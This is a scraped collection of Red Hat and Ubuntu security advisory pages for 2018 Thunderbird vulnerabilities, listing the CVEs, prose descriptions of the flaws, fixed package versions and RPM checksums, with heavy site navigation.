* [CVE-2018-12365](https://www.redhat.com/security/data/cve/CVE-2018-12365.html)
* [CVE-2018-12366](https://www.redhat.com/security/data/cve/CVE-2018-12366.html)
* [CVE-2018-12372](https://www.redhat.com/security/data/cve/CVE-2018-12372.html)
* [CVE-2018-12373](https://www.redhat.com/security/data/cve/CVE-2018-12373.html)
* [CVE-2018-12374](https://www.redhat.com/security/data/cve/CVE-2018-12374.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>
* <https://www.mozilla.org/en-US/security/advisories/mfsa2018-18/>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat Enterprise Linux Server 6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el6.src.rpm | SHA-256: a030fcb3b1bfeab0049bb0120696565395b89b5efcc50df188676cd72bcf2987 |
| x86\_64 | |
| thunderbird-52.9.1-1.el6.x86\_64.rpm | SHA-256: 0450acc8273aa1362d373a57c382cbe02d6caa1393431822b67472727646daae |
| thunderbird-52.9.1-1.el6.x86\_64.rpm | SHA-256: 0450acc8273aa1362d373a57c382cbe02d6caa1393431822b67472727646daae |
| thunderbird-debuginfo-52.9.1-1.el6.x86\_64.rpm | SHA-256: e51d48b2b50f574c13dd375e7a5e78cd6c71fd46e11d66fc27e4a304fb2b2c36 |
| i386 | |
| thunderbird-52.9.1-1.el6.i686.rpm | SHA-256: a3ebc7b42aebb30252ee6cb003ed9a73003901c9f890cd01d709db9c5f4a6aeb |
| thunderbird-debuginfo-52.9.1-1.el6.i686.rpm | SHA-256: 2dae102eb1f955d152c732cd956c3be12a9a3b82046fc7404073711150255d1e |

## Red Hat Enterprise Linux Server - Extended Life Cycle Support 6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el6.src.rpm | SHA-256: a030fcb3b1bfeab0049bb0120696565395b89b5efcc50df188676cd72bcf2987 |
| x86\_64 | |
| thunderbird-52.9.1-1.el6.x86\_64.rpm | SHA-256: 0450acc8273aa1362d373a57c382cbe02d6caa1393431822b67472727646daae |
| thunderbird-debuginfo-52.9.1-1.el6.x86\_64.rpm | SHA-256: e51d48b2b50f574c13dd375e7a5e78cd6c71fd46e11d66fc27e4a304fb2b2c36 |
| i386 | |
| thunderbird-52.9.1-1.el6.i686.rpm | SHA-256: a3ebc7b42aebb30252ee6cb003ed9a73003901c9f890cd01d709db9c5f4a6aeb |
| thunderbird-debuginfo-52.9.1-1.el6.i686.rpm | SHA-256: 2dae102eb1f955d152c732cd956c3be12a9a3b82046fc7404073711150255d1e |

## Red Hat Enterprise Linux Workstation 6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el6.src.rpm | SHA-256: a030fcb3b1bfeab0049bb0120696565395b89b5efcc50df188676cd72bcf2987 |
| x86\_64 | |
| thunderbird-52.9.1-1.el6.x86\_64.rpm | SHA-256: 0450acc8273aa1362d373a57c382cbe02d6caa1393431822b67472727646daae |
| thunderbird-debuginfo-52.9.1-1.el6.x86\_64.rpm | SHA-256: e51d48b2b50f574c13dd375e7a5e78cd6c71fd46e11d66fc27e4a304fb2b2c36 |
| i386 | |
| thunderbird-52.9.1-1.el6.i686.rpm | SHA-256: a3ebc7b42aebb30252ee6cb003ed9a73003901c9f890cd01d709db9c5f4a6aeb |
| thunderbird-debuginfo-52.9.1-1.el6.i686.rpm | SHA-256: 2dae102eb1f955d152c732cd956c3be12a9a3b82046fc7404073711150255d1e |

## Red Hat Enterprise Linux Desktop 6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el6.src.rpm | SHA-256: a030fcb3b1bfeab0049bb0120696565395b89b5efcc50df188676cd72bcf2987 |
| x86\_64 | |
| thunderbird-52.9.1-1.el6.x86\_64.rpm | SHA-256: 0450acc8273aa1362d373a57c382cbe02d6caa1393431822b67472727646daae |
| thunderbird-debuginfo-52.9.1-1.el6.x86\_64.rpm | SHA-256: e51d48b2b50f574c13dd375e7a5e78cd6c71fd46e11d66fc27e4a304fb2b2c36 |
| i386 | |
| thunderbird-52.9.1-1.el6.i686.rpm | SHA-256: a3ebc7b42aebb30252ee6cb003ed9a73003901c9f890cd01d709db9c5f4a6aeb |
| thunderbird-debuginfo-52.9.1-1.el6.i686.rpm | SHA-256: 2dae102eb1f955d152c732cd956c3be12a9a3b82046fc7404073711150255d1e |

## Red Hat Enterprise Linux for IBM z Systems 6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el6.src.rpm | SHA-256: a030fcb3b1bfeab0049bb0120696565395b89b5efcc50df188676cd72bcf2987 |
| s390x | |
| thunderbird-52.9.1-1.el6.s390x.rpm | SHA-256: 461022b5403570b8f99f6d1e232865bb8f909b0bd842867c3aa4fe971ccd7d21 |
| thunderbird-debuginfo-52.9.1-1.el6.s390x.rpm | SHA-256: 0bae570dbfac327a7dcdf696e56bc349758a9d99fcb781279617f6f1a81dac3c |

## Red Hat Enterprise Linux for Power, big endian 6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el6.src.rpm | SHA-256: a030fcb3b1bfeab0049bb0120696565395b89b5efcc50df188676cd72bcf2987 |
| ppc64 | |
| thunderbird-52.9.1-1.el6.ppc64.rpm | SHA-256: 8d10f4c8f58857260a483a464e34840ac8fbefc7ce02a4de8259fefd83b4acc2 |
| thunderbird-debuginfo-52.9.1-1.el6.ppc64.rpm | SHA-256: 8ccbc9d2ee3668276b503b3ef419d9d5ad6a0b32657826a73c70693f009cc8be |

## Red Hat Enterprise Linux Server - Extended Life Cycle Support (for IBM z Systems) 6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el6.src.rpm | SHA-256: a030fcb3b1bfeab0049bb0120696565395b89b5efcc50df188676cd72bcf2987 |
| s390x | |
| thunderbird-52.9.1-1.el6.s390x.rpm | SHA-256: 461022b5403570b8f99f6d1e232865bb8f909b0bd842867c3aa4fe971ccd7d21 |
| thunderbird-debuginfo-52.9.1-1.el6.s390x.rpm | SHA-256: 0bae570dbfac327a7dcdf696e56bc349758a9d99fcb781279617f6f1a81dac3c |

## Red Hat Enterprise Linux Server - Extended Life Cycle Support Extension 6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el6.src.rpm | SHA-256: a030fcb3b1bfeab0049bb0120696565395b89b5efcc50df188676cd72bcf2987 |
| x86\_64 | |
| thunderbird-52.9.1-1.el6.x86\_64.rpm | SHA-256: 0450acc8273aa1362d373a57c382cbe02d6caa1393431822b67472727646daae |
| thunderbird-debuginfo-52.9.1-1.el6.x86\_64.rpm | SHA-256: e51d48b2b50f574c13dd375e7a5e78cd6c71fd46e11d66fc27e4a304fb2b2c36 |
| i386 | |
| thunderbird-52.9.1-1.el6.i686.rpm | SHA-256: a3ebc7b42aebb30252ee6cb003ed9a73003901c9f890cd01d709db9c5f4a6aeb |
| thunderbird-debuginfo-52.9.1-1.el6.i686.rpm | SHA-256: 2dae102eb1f955d152c732cd956c3be12a9a3b82046fc7404073711150255d1e |

## Red Hat Enterprise Linux Server - Extended Life Cycle Support Extension (for IBM z Systems) 6

| SRPM | |
| --- | --- |
| thunderbird-52.9.1-1.el6.src.rpm | SHA-256: a030fcb3b1bfeab0049bb0120696565395b89b5efcc50df188676cd72bcf2987 |
| s390x | |
| thunderbird-52.9.1-1.el6.s390x.rpm | SHA-256: 461022b5403570b8f99f6d1e232865bb8f909b0bd842867c3aa4fe971ccd7d21 |
| thunderbird-debuginfo-52.9.1-1.el6.s390x.rpm | SHA-256: 0bae570dbfac327a7dcdf696e56bc349758a9d99fcb781279617f6f1a81dac3c |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from usn.ubuntu.com_d19af107_20250125_084124.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3714-1: Thunderbird vulnerabilities

12 July 2018

Several security issues were fixed in Thunderbird.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 17.10](/security/notices?release=artful)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service,

bypass CORS restrictions, obtain sensitive information, or execute

arbitrary code. ([CVE-2018-12359](/security/CVE-2018-12359), [CVE-2018-12360](/security/CVE-2018-12360), [CVE-2018-12362](/security/CVE-2018-12362),

[CVE-2018-12363](/security/CVE-2018-12363), [CVE-2018-12364](/security/CVE-2018-12364), [CVE-2018-12365](/security/CVE-2018-12365), [CVE-2018-12366](/security/CVE-2018-12366))

It was discovered that S/MIME and PGP decryption oracles can be built with

HTML emails. An attacker could potentially exploit this to obtain

sensitive information. ([CVE-2018-12372](/security/CVE-2018-12372))

It was discovered that S/MIME plaintext can be leaked through HTML

reply/forward. An attacker could potentially exploit this to obtain

sensitive information. ([CVE-2018-12373](/security/CVE-2018-12373))

It was discovered that forms can be used to exfiltrate encrypted mail

parts by pressing enter in a form field. An attacker could potentially

exploit this to obtain sensitive information. ([CVE-2018-12374](/security/CVE-2018-12374))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:52.9.1+build3-0ubuntu0.18.04.1](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A52.9.1%2Bbuild3-0ubuntu0.18.04.1)

##### Ubuntu 17.10

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:52.9.1+build3-0ubuntu0.17.10.1](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A52.9.1%2Bbuild3-0ubuntu0.17.10.1)

##### Ubuntu 16.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:52.9.1+build3-0ubuntu0.16.04.1](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A52.9.1%2Bbuild3-0ubuntu0.16.04.1)

##### Ubuntu 14.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:52.9.1+build3-0ubuntu0.14.04.1](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A52.9.1%2Bbuild3-0ubuntu0.14.04.1)

After a standard system update you need to restart Thunderbird to make

all the necessary changes.

## References

* [CVE-2018-12359](/security/CVE-2018-12359)
* [CVE-2018-12360](/security/CVE-2018-12360)
* [CVE-2018-12362](/security/CVE-2018-12362)
* [CVE-2018-12363](/security/CVE-2018-12363)
* [CVE-2018-12364](/security/CVE-2018-12364)
* [CVE-2018-12365](/security/CVE-2018-12365)
* [CVE-2018-12366](/security/CVE-2018-12366)
* [CVE-2018-12372](/security/CVE-2018-12372)
* [CVE-2018-12373](/security/CVE-2018-12373)
* [CVE-2018-12374](/security/CVE-2018-12374)
* [CVE-2018-5188](/security/CVE-2018-5188)

## Related notices

* [USN-3705-1](/security/notices/USN-3705-1)
* [USN-3749-1](/security/notices/USN-3749-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from www.redhat.com_805b70eb_20250126_073635.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.redhat.com_4593b393_20250126_073638.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
